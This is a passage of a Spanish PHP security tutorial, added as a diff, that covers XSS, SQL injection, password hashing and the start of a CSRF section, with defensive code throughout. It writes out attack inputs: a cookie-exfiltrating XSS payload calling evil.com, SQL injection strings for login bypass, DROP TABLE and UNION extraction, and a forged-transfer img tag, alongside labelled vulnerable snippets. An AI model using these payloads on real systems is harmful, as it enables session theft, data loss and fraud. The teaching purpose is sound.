@@ -1,0 +1,563 @@
+﻿<section id="seguridad" style="background:var(--bg2);">
+<div class="section">
+  <div class="section-header">
+    <span class="section-tag">🛡 Módulo 7</span>
+    <h2 class="section-title">Seguridad en PHP</h2>
+    <p class="section-subtitle">Las vulnerabilidades más comunes y cómo proteger tu aplicación.</p>
+  </div>
+
+
+  <!-- XSS -->
+  <div class="concept-card">
+    <div class="concept-header">
+      <div class="concept-num" style="background:linear-gradient(135deg,#ff6b6b,#ff9a3c)">1</div>
+      <div>
+        <div class="concept-title">XSS — Cross-Site Scripting</div>
+        <div class="concept-desc">Inyección de código JavaScript malicioso en páginas web. La vulnerabilidad web más frecuente.</div>
+      </div>
+    </div>
+    <div class="concept-body">
+      <div class="alert alert-warn"><span class="alert-icon">⚠️</span> XSS ocurre cuando <strong>datos del usuario se muestran sin sanitizar</strong> en HTML. El atacante inyecta JavaScript que roba cookies, redirige o manipula la página.</div>
+      <div class="tabs">
+        <button class="tab-btn active" onclick="showTab(this,'xss-tipos')">Tipos de XSS</button>
+        <button class="tab-btn" onclick="showTab(this,'xss-def')">Defensa</button>
+        <button class="tab-btn" onclick="showTab(this,'xss-csp')">CSP Headers</button>
+      </div>
+
+      <div id="xss-tipos" class="tab-content active">
+        <table class="data-table" style="margin-bottom:1rem">
+          <tr><th>Tipo</th><th>Cómo funciona</th><th>Ejemplo de ataque</th></tr>
+          <tr><td><strong style="color:#ef5350">Reflejado</strong></td><td>El script viene en la URL/formulario y se muestra de inmediato</td><td><code>?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+          <tr><td><strong style="color:#ff7043">Almacenado</strong></td><td>El script se guarda en BD y se ejecuta para todos los visitantes</td><td>Comentario con <code>&lt;script&gt;</code> guardado</td></tr>
+          <tr><td><strong style="color:#ffa726">DOM-based</strong></td><td>JavaScript manipula el DOM sin pasar por el servidor</td><td><code>document.write(location.hash)</code></td></tr>
+        </table>
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>xss_ejemplo.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="tag">&lt;?php</span>
+<span class="cmt">// ❌ VULNERABLE — muestra datos sin sanitizar</span>
+<span class="var">$nombre</span> <span class="op">=</span> <span class="var">$_GET</span>[<span class="str">'nombre'</span>]<span class="op">;</span>
+<span class="fn">echo</span> <span class="str">"&lt;h1&gt;Hola, <span class="var">$nombre</span>&lt;/h1&gt;"</span><span class="op">;</span>
+<span class="cmt">// Ataque: ?nombre=&lt;script&gt;document.cookie&lt;/script&gt;</span>
+<span class="cmt">// Roba las cookies del usuario → sesión comprometida</span>
+
+<span class="cmt">// ❌ También vulnerable en atributos HTML</span>
+<span class="fn">echo</span> <span class="str">"&lt;input value='<span class="var">$nombre</span>'"</span><span class="op">;</span>
+<span class="cmt">// Ataque: ?nombre=' onmouseover='alert(1)</span>
+<span class="tag">?&gt;</span></pre>
+        </div>
+        <div class="visual-box">
+          <div class="visual-label">▶ Payload XSS clásico</div>
+          <div class="output-err"><code>&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</code></div>
+          <div style="font-size:.78rem;color:var(--text3);margin-top:.4rem">← Envía las cookies al servidor del atacante</div>
+        </div>
+      </div>
+
+      <div id="xss-def" class="tab-content">
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>xss_defensa.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="tag">&lt;?php</span>
+<span class="cmt">// ✅ REGLA DE ORO: sanitizar SIEMPRE al mostrar, no al guardar</span>
+
+<span class="cmt">// 1. htmlspecialchars — convierte caracteres peligrosos</span>
+<span class="kw">function</span> <span class="fn">e</span>(<span class="kw">string</span> <span class="var">$s</span>): <span class="kw">string</span> {
+    <span class="kw">return</span> <span class="fn">htmlspecialchars</span>(<span class="var">$s</span><span class="op">,</span> <span class="kw">ENT_QUOTES</span> <span class="op">|</span> <span class="kw">ENT_HTML5</span><span class="op">,</span> <span class="str">'UTF-8'</span>)<span class="op">;</span>
+}
+<span class="fn">echo</span> <span class="str">"&lt;h1&gt;Hola, "</span> <span class="op">.</span> <span class="fn">e</span>(<span class="var">$_GET</span>[<span class="str">'nombre'</span>]) <span class="op">.</span> <span class="str">"&lt;/h1&gt;"</span><span class="op">;</span>
+<span class="cmt">// &lt;script&gt; se convierte en &amp;lt;script&amp;gt; → inofensivo</span>
+
+<span class="cmt">// 2. En atributos HTML — también escapar</span>
+<span class="fn">echo</span> <span class="str">'&lt;input value="'</span> <span class="op">.</span> <span class="fn">e</span>(<span class="var">$_GET</span>[<span class="str">'nombre'</span>]) <span class="op">.</span> <span class="str">'"&gt;'</span><span class="op">;</span>
+
+<span class="cmt">// 3. En JSON para JavaScript — json_encode escapa por defecto</span>
+<span class="var">$datos</span> <span class="op">=</span> [<span class="str">'nombre'</span> <span class="op">=&gt;</span> <span class="var">$_GET</span>[<span class="str">'nombre'</span>]]<span class="op">;</span>
+<span class="fn">echo</span> <span class="str">'&lt;script&gt;var datos = '</span> <span class="op">.</span> <span class="fn">json_encode</span>(<span class="var">$datos</span>) <span class="op">.</span> <span class="str">';&lt;/script&gt;'</span><span class="op">;</span>
+
+<span class="cmt">// 4. Cookies con HttpOnly — JS no puede acceder</span>
+<span class="fn">setcookie</span>(<span class="str">'session'</span><span class="op">,</span> <span class="var">$token</span><span class="op">,</span> [
+    <span class="str">'httponly'</span> <span class="op">=&gt;</span> <span class="kw">true</span><span class="op">,</span>   <span class="cmt">// bloquea acceso desde JS</span>
+    <span class="str">'secure'</span>   <span class="op">=&gt;</span> <span class="kw">true</span><span class="op">,</span>   <span class="cmt">// solo por HTTPS</span>
+    <span class="str">'samesite'</span> <span class="op">=&gt;</span> <span class="str">'Strict'</span><span class="op">,</span>
+])<span class="op">;</span>
+<span class="tag">?&gt;</span></pre>
+        </div>
+        <div class="visual-box">
+          <div class="visual-label">▶ Transformación htmlspecialchars</div>
+          <div class="output-err">Input: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></div>
+          <div class="output-success">Output: <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code> ← texto inofensivo</div>
+        </div>
+      </div>
+
+      <div id="xss-csp" class="tab-content">
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>headers_seguridad.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="tag">&lt;?php</span>
+<span class="cmt">// Content Security Policy — controla qué scripts se pueden ejecutar</span>
+<span class="fn">header</span>(<span class="str">"Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"</span>)<span class="op">;</span>
+
+<span class="cmt">// X-XSS-Protection — activa el filtro XSS del navegador (legado)</span>
+<span class="fn">header</span>(<span class="str">"X-XSS-Protection: 1; mode=block"</span>)<span class="op">;</span>
+
+<span class="cmt">// X-Content-Type-Options — evita MIME sniffing</span>
+<span class="fn">header</span>(<span class="str">"X-Content-Type-Options: nosniff"</span>)<span class="op">;</span>
+
+<span class="cmt">// X-Frame-Options — evita clickjacking (la página en iframes)</span>
+<span class="fn">header</span>(<span class="str">"X-Frame-Options: DENY"</span>)<span class="op">;</span>
+
+<span class="cmt">// Referrer-Policy — controla qué información se envía al navegar</span>
+<span class="fn">header</span>(<span class="str">"Referrer-Policy: strict-origin-when-cross-origin"</span>)<span class="op">;</span>
+
+<span class="cmt">// Strict-Transport-Security — fuerza HTTPS por 1 año</span>
+<span class="fn">header</span>(<span class="str">"Strict-Transport-Security: max-age=31536000; includeSubDomains"</span>)<span class="op">;</span>
+
+<span class="cmt">// Función helper para aplicar todos los headers de una vez</span>
+<span class="kw">function</span> <span class="fn">aplicarHeadersSeguridad</span>(): <span class="kw">void</span> {
+    <span class="var">$headers</span> <span class="op">=</span> [
+        <span class="str">"Content-Security-Policy: default-src 'self'"</span><span class="op">,</span>
+        <span class="str">"X-Content-Type-Options: nosniff"</span><span class="op">,</span>
+        <span class="str">"X-Frame-Options: DENY"</span><span class="op">,</span>
+        <span class="str">"Referrer-Policy: strict-origin-when-cross-origin"</span><span class="op">,</span>
+        <span class="str">"Strict-Transport-Security: max-age=31536000"</span><span class="op">,</span>
+    ]<span class="op">;</span>
+    <span class="kw">foreach</span> (<span class="var">$headers</span> <span class="kw">as</span> <span class="var">$h</span>) <span class="fn">header</span>(<span class="var">$h</span>)<span class="op">;</span>
+}
+<span class="tag">?&gt;</span></pre>
+        </div>
+        <div class="alert alert-tip" style="margin-top:1rem"><span class="alert-icon">💡</span> Llama a <code>aplicarHeadersSeguridad()</code> al inicio de cada request, antes de enviar cualquier HTML. Colócalo en un archivo de configuración que se incluya en todos los archivos.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SQL INJECTION -->
+  <div class="concept-card">
+    <div class="concept-header">
+      <div class="concept-num" style="background:linear-gradient(135deg,#ff6b6b,#ff9a3c)">2</div>
+      <div>
+        <div class="concept-title">SQL Injection</div>
+        <div class="concept-desc">Inyección de código SQL para leer, modificar o eliminar datos de la base de datos.</div>
+      </div>
+    </div>
+    <div class="concept-body">
+      <div class="alert alert-warn"><span class="alert-icon">⚠️</span> SQL Injection ocurre cuando datos del usuario se concatenan directamente en una consulta SQL. La defensa es usar <strong>siempre sentencias preparadas con PDO</strong>.</div>
+      <div class="tabs">
+        <button class="tab-btn active" onclick="showTab(this,'sqli-ataque')">Ataque</button>
+        <button class="tab-btn" onclick="showTab(this,'sqli-def')">Defensa con PDO</button>
+        <button class="tab-btn" onclick="showTab(this,'sqli-extra')">Capas adicionales</button>
+      </div>
+
+      <div id="sqli-ataque" class="tab-content active">
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>sqli_vulnerable.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="tag">&lt;?php</span>
+<span class="cmt">// ❌ VULNERABLE — concatenación directa</span>
+<span class="var">$user</span> <span class="op">=</span> <span class="var">$_POST</span>[<span class="str">'usuario'</span>]<span class="op">;</span>
+<span class="var">$pass</span> <span class="op">=</span> <span class="var">$_POST</span>[<span class="str">'password'</span>]<span class="op">;</span>
+<span class="var">$sql</span>  <span class="op">=</span> <span class="str">"SELECT * FROM usuarios WHERE usuario='<span class="var">$user</span>' AND password='<span class="var">$pass</span>'"</span><span class="op">;</span>
+
+<span class="cmt">// ══ ATAQUES POSIBLES ══════════════════════════════════════</span>
+
+<span class="cmt">// 1. Bypass de login (entra sin contraseña)</span>
+<span class="cmt">// usuario = admin'-- </span>
+<span class="cmt">// SQL resultante: ... WHERE usuario='admin'--' AND password='...'</span>
+<span class="cmt">// El -- comenta el resto → ignora la comprobación de password</span>
+
+<span class="cmt">// 2. Leer todos los usuarios</span>
+<span class="cmt">// id = 1 OR 1=1</span>
+<span class="cmt">// SQL: WHERE id = 1 OR 1=1  → devuelve TODAS las filas</span>
+
+<span class="cmt">// 3. Eliminar datos (DROP TABLE)</span>
+<span class="cmt">// id = 1; DROP TABLE usuarios;--</span>
+<span class="cmt">// SQL: WHERE id=1; DROP TABLE usuarios;-- (con multi-query)</span>
+
+<span class="cmt">// 4. Extraer datos de otras tablas (UNION)</span>
+<span class="cmt">// id = 0 UNION SELECT user,password,3,4 FROM mysql.user--</span>
+<span class="tag">?&gt;</span></pre>
+        </div>
+        <div class="visual-box">
+          <div class="visual-label">▶ Impacto de SQL Injection</div>
+          <div class="output-err">🔓 Login sin contraseña (bypass)</div>
+          <div class="output-err">📂 Lectura de toda la base de datos</div>
+          <div class="output-err">🗑 Eliminación de tablas completas</div>
+          <div class="output-err">🔑 Robo de credenciales de admin de MySQL</div>
+        </div>
+      </div>
+
+      <div id="sqli-def" class="tab-content">
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>sqli_defensa.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="tag">&lt;?php</span>
+<span class="cmt">// ✅ SENTENCIAS PREPARADAS — PDO separa SQL de datos</span>
+
+<span class="cmt">// Login seguro</span>
+<span class="var">$stmt</span> <span class="op">=</span> <span class="var">$pdo</span><span class="op">-&gt;</span><span class="fn">prepare</span>(<span class="str">"SELECT * FROM usuarios WHERE usuario = :user LIMIT 1"</span>)<span class="op">;</span>
+<span class="var">$stmt</span><span class="op">-&gt;</span><span class="fn">execute</span>([<span class="str">':user'</span> <span class="op">=&gt;</span> <span class="var">$_POST</span>[<span class="str">'usuario'</span>]])<span class="op">;</span>
+<span class="var">$usuario</span> <span class="op">=</span> <span class="var">$stmt</span><span class="op">-&gt;</span><span class="fn">fetch</span>()<span class="op">;</span>
+
+<span class="kw">if</span> (<span class="var">$usuario</span> <span class="op">&amp;&amp;</span> <span class="fn">password_verify</span>(<span class="var">$_POST</span>[<span class="str">'password'</span>]<span class="op">,</span> <span class="var">$usuario</span>[<span class="str">'password_hash'</span>])) {
+    <span class="fn">echo</span> <span class="str">"✅ Login correcto"</span><span class="op">;</span>
+}
+
+<span class="cmt">// Parámetros posicionales (?) — alternativa a :nombre</span>
+<span class="var">$stmt</span> <span class="op">=</span> <span class="var">$pdo</span><span class="op">-&gt;</span><span class="fn">prepare</span>(<span class="str">"SELECT * FROM productos WHERE categoria = ? AND precio &lt; ?"</span>)<span class="op">;</span>
+<span class="var">$stmt</span><span class="op">-&gt;</span><span class="fn">execute</span>([<span class="var">$_GET</span>[<span class="str">'cat'</span>]<span class="op">,</span> <span class="var">$_GET</span>[<span class="str">'max_precio'</span>]])<span class="op">;</span>
+
+<span class="cmt">// Columnas y tablas dinámicas — NO se pueden parametrizar</span>
+<span class="cmt">// Para éstas usar allowlist explícita</span>
+<span class="var">$columnasValidas</span> <span class="op">=</span> [<span class="str">'nombre'</span><span class="op">,</span> <span class="str">'precio'</span><span class="op">,</span> <span class="str">'fecha'</span>]<span class="op">;</span>
+<span class="var">$orden</span> <span class="op">=</span> <span class="var">$_GET</span>[<span class="str">'orden'</span>] <span class="op">??</span> <span class="str">'nombre'</span><span class="op">;</span>
+
+<span class="kw">if</span> (<span class="op">!</span><span class="fn">in_array</span>(<span class="var">$orden</span><span class="op">,</span> <span class="var">$columnasValidas</span><span class="op">,</span> <span class="kw">true</span>)) {
+    <span class="fn">die</span>(<span class="str">"Columna no válida"</span>)<span class="op">;</span>
+}
+<span class="cmt">// Ahora sí es seguro interpolarlo en el SQL</span>
+<span class="var">$sql</span> <span class="op">=</span> <span class="str">"SELECT * FROM productos ORDER BY <span class="var">$orden</span>"</span><span class="op">;</span>
+<span class="tag">?&gt;</span></pre>
+        </div>
+        <div class="visual-box">
+          <div class="visual-label">▶ Por qué las sentencias preparadas son seguras</div>
+          <div class="output-success">El SQL y los datos viajan SEPARADOS al motor de BD</div>
+          <div class="output-success">El motor trata los parámetros SIEMPRE como datos, nunca como código</div>
+          <div class="output-success">admin'-- se almacena como texto literal, no como SQL</div>
+        </div>
+      </div>
+
+      <div id="sqli-extra" class="tab-content">
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>capas_defensa.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="tag">&lt;?php</span>
+<span class="cmt">// Defensa en profundidad — múltiples capas</span>
+
+<span class="cmt">// 1. Validar tipos antes de usar</span>
+<span class="var">$id</span>    <span class="op">=</span> <span class="fn">filter_var</span>(<span class="var">$_GET</span>[<span class="str">'id'</span>]<span class="op">,</span> <span class="kw">FILTER_VALIDATE_INT</span>)<span class="op">;</span>
+<span class="var">$email</span> <span class="op">=</span> <span class="fn">filter_var</span>(<span class="var">$_POST</span>[<span class="str">'email'</span>]<span class="op">,</span> <span class="kw">FILTER_VALIDATE_EMAIL</span>)<span class="op">;</span>
+<span class="kw">if</span> (<span class="var">$id</span> <span class="op">===</span> <span class="kw">false</span>)    <span class="fn">die</span>(<span class="str">"ID inválido"</span>)<span class="op">;</span>
+<span class="kw">if</span> (<span class="var">$email</span> <span class="op">===</span> <span class="kw">false</span>) <span class="fn">die</span>(<span class="str">"Email inválido"</span>)<span class="op">;</span>
+
+<span class="cmt">// 2. Principio de mínimo privilegio en BD</span>
+<span class="cmt">// El usuario de BD de la app NO debe tener DROP, CREATE, GRANT</span>
+<span class="cmt">// Solo SELECT, INSERT, UPDATE, DELETE en las tablas necesarias</span>
+<span class="cmt">// GRANT SELECT, INSERT ON tienda.* TO 'app_user'@'localhost';</span>
+
+<span class="cmt">// 3. PDO con manejo de errores silencioso en producción</span>
+<span class="var">$pdo</span> <span class="op">=</span> <span class="kw">new</span> <span class="fn">PDO</span>(<span class="var">$dsn</span><span class="op">,</span> <span class="var">$user</span><span class="op">,</span> <span class="var">$pass</span><span class="op">,</span> [
+    <span class="kw">PDO</span>::<span class="fn">ATTR_ERRMODE</span>            <span class="op">=&gt;</span> <span class="kw">PDO</span>::<span class="fn">ERRMODE_EXCEPTION</span><span class="op">,</span>
+    <span class="kw">PDO</span>::<span class="fn">ATTR_DEFAULT_FETCH_MODE</span> <span class="op">=&gt;</span> <span class="kw">PDO</span>::<span class="fn">FETCH_ASSOC</span><span class="op">,</span>
+    <span class="kw">PDO</span>::<span class="fn">ATTR_EMULATE_PREPARES</span>   <span class="op">=&gt;</span> <span class="kw">false</span><span class="op">,</span>  <span class="cmt">// sentencias preparadas reales</span>
+])<span class="op">;</span>
+
+<span class="cmt">// 4. Ocultar errores de BD al usuario</span>
+<span class="kw">try</span> {
+    <span class="var">$stmt</span> <span class="op">=</span> <span class="var">$pdo</span><span class="op">-&gt;</span><span class="fn">prepare</span>(<span class="str">"SELECT * FROM productos WHERE id = :id"</span>)<span class="op">;</span>
+    <span class="var">$stmt</span><span class="op">-&gt;</span><span class="fn">execute</span>([<span class="str">':id'</span> <span class="op">=&gt;</span> <span class="var">$id</span>])<span class="op">;</span>
+} <span class="kw">catch</span> (<span class="fn">PDOException</span> <span class="var">$e</span>) {
+    <span class="fn">error_log</span>(<span class="var">$e</span><span class="op">-&gt;</span><span class="fn">getMessage</span>())<span class="op">;</span>   <span class="cmt">// registrar internamente</span>
+    <span class="fn">die</span>(<span class="str">"Error al procesar la solicitud"</span>)<span class="op">;</span>  <span class="cmt">// mensaje genérico al usuario</span>
+}
+<span class="tag">?&gt;</span></pre>
+        </div>
+        <div class="alert alert-tip" style="margin-top:1rem"><span class="alert-icon">💡</span> Las sentencias preparadas son la defensa principal. Combínalas con: validación de entrada, mínimo privilegio en BD, errores silenciosos en producción y logs internos.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PASSWORD HASHING -->
+  <div class="concept-card">
+    <div class="concept-header">
+      <div class="concept-num" style="background:linear-gradient(135deg,#06d6a0,#0096c7)">3</div>
+      <div>
+        <div class="concept-title">Hash de Contraseñas</div>
+        <div class="concept-desc">Nunca almacenes contraseñas en texto plano ni con MD5/SHA1. Usa password_hash().</div>
+      </div>
+    </div>
+    <div class="concept-body">
+      <div class="tabs">
+        <button class="tab-btn active" onclick="showTab(this,'pw-hash')">Hash y verify</button>
+        <button class="tab-btn" onclick="showTab(this,'pw-argon')">Argon2 y opciones</button>
+        <button class="tab-btn" onclick="showTab(this,'pw-flow')">Flujo completo</button>
+      </div>
+
+      <div id="pw-hash" class="tab-content active">
+        <table class="data-table" style="margin-bottom:1rem">
+          <tr><th>Método</th><th>Seguridad</th><th>¿Usar?</th><th>Razón</th></tr>
+          <tr><td>Texto plano</td><td>💀 Nula</td><td>❌ Nunca</td><td>Cualquiera que acceda a la BD ve la contraseña</td></tr>
+          <tr><td>MD5 / SHA1</td><td>🔴 Muy baja</td><td>❌ Nunca</td><td>Tablas rainbow, sin salt, demasiado rápido</td></tr>
+          <tr><td>SHA256 manual</td><td>🟡 Baja</td><td>❌ No</td><td>Sin factor de trabajo adaptativo</td></tr>
+          <tr><td><code>password_hash()</code> bcrypt</td><td>🟢 Alta</td><td>✅ Sí</td><td>Salt automático, lento por diseño, adaptativo</td></tr>
+          <tr><td><code>password_hash()</code> Argon2id</td><td>🟢🟢 Muy alta</td><td>✅ Sí</td><td>Resistente a GPU y side-channel attacks</td></tr>
+        </table>
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>password_hash.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="tag">&lt;?php</span>
+<span class="cmt">// ✅ Al REGISTRAR — crear hash seguro</span>
+<span class="var">$password</span> <span class="op">=</span> <span class="var">$_POST</span>[<span class="str">'password'</span>]<span class="op">;</span>
+<span class="var">$hash</span>     <span class="op">=</span> <span class="fn">password_hash</span>(<span class="var">$password</span><span class="op">,</span> <span class="kw">PASSWORD_DEFAULT</span>)<span class="op">;</span>
+<span class="cmt">// Guardar $hash en la BD — NUNCA $password</span>
+
+<span class="fn">echo</span> <span class="var">$hash</span><span class="op">;</span>
+<span class="cmt">// $2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy</span>
+<span class="cmt">// └─ $2y$ = bcrypt  $10$ = cost factor  resto = salt+hash</span>
+
+<span class="cmt">// ✅ Al HACER LOGIN — verificar hash</span>
+<span class="var">$hashBD</span> <span class="op">=</span> <span class="str">'$2y$10$...'</span><span class="op">;</span>  <span class="cmt">// recuperado de la BD</span>
+<span class="kw">if</span> (<span class="fn">password_verify</span>(<span class="var">$password</span><span class="op">,</span> <span class="var">$hashBD</span>)) {
+    <span class="fn">echo</span> <span class="str">"✅ Acceso permitido"</span><span class="op">;</span>
+} <span class="kw">else</span> {
+    <span class="fn">echo</span> <span class="str">"❌ Contraseña incorrecta"</span><span class="op">;</span>
+}
+
+<span class="cmt">// ✅ Rehashing — actualizar si el algoritmo mejora</span>
+<span class="kw">if</span> (<span class="fn">password_verify</span>(<span class="var">$password</span><span class="op">,</span> <span class="var">$hashBD</span>)
+    <span class="op">&amp;&amp;</span> <span class="fn">password_needs_rehash</span>(<span class="var">$hashBD</span><span class="op">,</span> <span class="kw">PASSWORD_DEFAULT</span>)) {
+    <span class="var">$nuevoHash</span> <span class="op">=</span> <span class="fn">password_hash</span>(<span class="var">$password</span><span class="op">,</span> <span class="kw">PASSWORD_DEFAULT</span>)<span class="op">;</span>
+    <span class="cmt">// UPDATE usuarios SET password_hash = ? WHERE id = ?</span>
+}
+<span class="tag">?&gt;</span></pre>
+        </div>
+        <div class="visual-box">
+          <div class="visual-label">▶ Mismo password → hashes distintos (salt aleatorio)</div>
+          <div class="output-info">password_hash("mipass") → $2y$10$abc123...XYZ</div>
+          <div class="output-info">password_hash("mipass") → $2y$10$def456...ABC ← diferente</div>
+          <div class="output-success">password_verify("mipass", cualquiera de los dos) → true ✅</div>
+        </div>
+      </div>
+
+      <div id="pw-argon" class="tab-content">
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>argon2.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="tag">&lt;?php</span>
+<span class="cmt">// bcrypt con cost factor personalizado (por defecto 10)</span>
+<span class="cmt">// Mayor cost = más lento pero más seguro</span>
+<span class="var">$hash</span> <span class="op">=</span> <span class="fn">password_hash</span>(<span class="var">$password</span><span class="op">,</span> <span class="kw">PASSWORD_BCRYPT</span><span class="op">,</span> [
+    <span class="str">'cost'</span> <span class="op">=&gt;</span> <span class="num">12</span>  <span class="cmt">// recomendado para servidores modernos</span>
+])<span class="op">;</span>
+
+<span class="cmt">// Argon2id — más seguro que bcrypt (PHP 7.3+)</span>
+<span class="kw">if</span> (<span class="fn">defined</span>(<span class="str">'PASSWORD_ARGON2ID'</span>)) {
+    <span class="var">$hash</span> <span class="op">=</span> <span class="fn">password_hash</span>(<span class="var">$password</span><span class="op">,</span> <span class="kw">PASSWORD_ARGON2ID</span><span class="op">,</span> [
+        <span class="str">'memory_cost'</span> <span class="op">=&gt;</span> <span class="num">65536</span><span class="op">,</span>  <span class="cmt">// 64 MB de RAM</span>
+        <span class="str">'time_cost'</span>   <span class="op">=&gt;</span> <span class="num">4</span><span class="op">,</span>      <span class="cmt">// iteraciones</span>
+        <span class="str">'threads'</span>     <span class="op">=&gt;</span> <span class="num">3</span><span class="op">,</span>      <span class="cmt">// hilos paralelos</span>
+    ])<span class="op">;</span>
+}
+
+<span class="cmt">// Elegir el mejor disponible automáticamente</span>
+<span class="var">$algoritmo</span> <span class="op">=</span> <span class="fn">defined</span>(<span class="str">'PASSWORD_ARGON2ID'</span>) <span class="op">?</span> <span class="kw">PASSWORD_ARGON2ID</span> <span class="op">:</span> <span class="kw">PASSWORD_DEFAULT</span><span class="op">;</span>
+<span class="var">$hash</span>      <span class="op">=</span> <span class="fn">password_hash</span>(<span class="var">$password</span><span class="op">,</span> <span class="var">$algoritmo</span>)<span class="op">;</span>
+
+<span class="cmt">// Benchmarking — encontrar el cost factor adecuado para tu servidor</span>
+<span class="var">$target</span> <span class="op">=</span> <span class="num">0.1</span><span class="op">;</span>  <span class="cmt">// objetivo: 100ms por hash</span>
+<span class="var">$cost</span>   <span class="op">=</span> <span class="num">8</span><span class="op">;</span>
+<span class="kw">do</span> {
+    <span class="var">$cost</span><span class="op">++</span><span class="op">;</span>
+    <span class="var">$inicio</span> <span class="op">=</span> <span class="fn">microtime</span>(<span class="kw">true</span>)<span class="op">;</span>
+    <span class="fn">password_hash</span>(<span class="str">"test"</span><span class="op">,</span> <span class="kw">PASSWORD_BCRYPT</span><span class="op">,</span> [<span class="str">'cost'</span> <span class="op">=&gt;</span> <span class="var">$cost</span>])<span class="op">;</span>
+} <span class="kw">while</span> (<span class="fn">microtime</span>(<span class="kw">true</span>) <span class="op">-</span> <span class="var">$inicio</span> <span class="op">&lt;</span> <span class="var">$target</span>)<span class="op">;</span>
+<span class="fn">echo</span> <span class="str">"Cost óptimo para este servidor: <span class="var">$cost</span>"</span><span class="op">;</span>
+<span class="tag">?&gt;</span></pre>
+        </div>
+      </div>
+
+      <div id="pw-flow" class="tab-content">
+        <div style="background:var(--bg3);border-radius:10px;padding:1.2rem;margin-bottom:1rem">
+          <div style="font-weight:700;color:var(--accent);margin-bottom:.8rem;font-size:.88rem">🔄 Flujo completo de contraseñas</div>
+          <div style="font-size:.82rem;color:var(--text2);line-height:2.2;font-family:monospace">
+            <div><span style="color:#66bb6a">REGISTRO:</span> &nbsp; $_POST['password'] → validar longitud/complejidad → <code>password_hash()</code> → guardar hash en BD</div>
+            <div><span style="color:#42a5f5">LOGIN: &nbsp;&nbsp;&nbsp;</span> &nbsp; $_POST['password'] + hash de BD → <code>password_verify()</code> → true/false</div>
+            <div><span style="color:#ffa726">REHASH: &nbsp;</span> &nbsp; Tras login exitoso → <code>password_needs_rehash()</code> → actualizar si es true</div>
+            <div><span style="color:#ab47bc">CAMBIO: &nbsp;</span> &nbsp; Verificar contraseña actual → validar nueva → <code>password_hash()</code> → actualizar BD</div>
+            <div><span style="color:#ef5350">OLVIDO: &nbsp;</span> &nbsp; Email con token único de 1 uso → validar token → nueva contraseña → invalidar token</div>
+          </div>
+        </div>
+        <div class="alert alert-warn"><span class="alert-icon">⚠️</span> Nunca envíes la contraseña por email (ni en "recordatorio"). Envía un <strong>token de restablecimiento</strong> de un solo uso con expiración (15-60 minutos).</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CSRF -->
+  <div class="concept-card">
+    <div class="concept-header">
+      <div class="concept-num" style="background:linear-gradient(135deg,#ff6b6b,#ff9a3c)">4</div>
+      <div>
+        <div class="concept-title">CSRF — Cross-Site Request Forgery</div>
+        <div class="concept-desc">Ataque que fuerza al usuario autenticado a ejecutar acciones no deseadas en tu app.</div>
+      </div>
+    </div>
+    <div class="concept-body">
+      <div class="alert alert-warn"><span class="alert-icon">⚠️</span> CSRF explota que el navegador envía automáticamente las cookies de sesión. El atacante engaña al usuario para que haga una petición a tu app desde otro sitio.</div>
+      <div class="tabs">
+        <button class="tab-btn active" onclick="showTab(this,'csrf-como')">¿Cómo funciona?</button>
+        <button class="tab-btn" onclick="showTab(this,'csrf-token')">Token CSRF</button>
+        <button class="tab-btn" onclick="showTab(this,'csrf-extra')">SameSite Cookies</button>
+      </div>
+
+      <div id="csrf-como" class="tab-content active">
+        <div style="background:var(--bg3);border-radius:10px;padding:1rem;margin-bottom:1rem">
+          <div style="font-weight:700;color:#ef5350;margin-bottom:.6rem;font-size:.88rem">🎭 Escenario de ataque CSRF</div>
+          <div style="font-size:.82rem;color:var(--text2);line-height:1.8;font-family:monospace">
+            <div>1. Usuario inicia sesión en <span style="color:#42a5f5">banco.com</span> → cookie de sesión guardada</div>
+            <div>2. Usuario visita <span style="color:#ef5350">evil.com</span> (sitio malicioso del atacante)</div>
+            <div>3. <span style="color:#ef5350">evil.com</span> tiene: <code>&lt;img src="banco.com/transferir?monto=1000&amp;a=atacante"&gt;</code></div>
+            <div>4. El navegador hace la petición a <span style="color:#42a5f5">banco.com</span> <strong style="color:var(--text1)">con la cookie de sesión</strong></div>
+            <div>5. <span style="color:#42a5f5">banco.com</span> procesa la transferencia creyendo que es el usuario</div>
+            <div>6. <span style="color:#ef5350">💸 El atacante recibe el dinero</span></div>
+          </div>
